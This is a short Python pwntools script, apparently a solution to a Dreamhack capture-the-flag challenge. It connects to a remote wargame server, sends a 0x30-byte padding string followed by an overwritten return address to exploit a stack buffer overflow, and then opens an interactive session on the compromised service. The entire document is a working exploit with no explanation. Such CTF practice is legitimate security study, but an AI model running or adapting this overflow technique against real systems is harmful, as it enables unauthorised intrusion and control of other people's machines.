from pwn import *

context.update(log_level = 'debug')
p = remote('host1.dreamhack.games', 8589)
p.recvrepeat(1)
p.sendline('a'*0x30 + p32(0x804867B))
p.interactive()

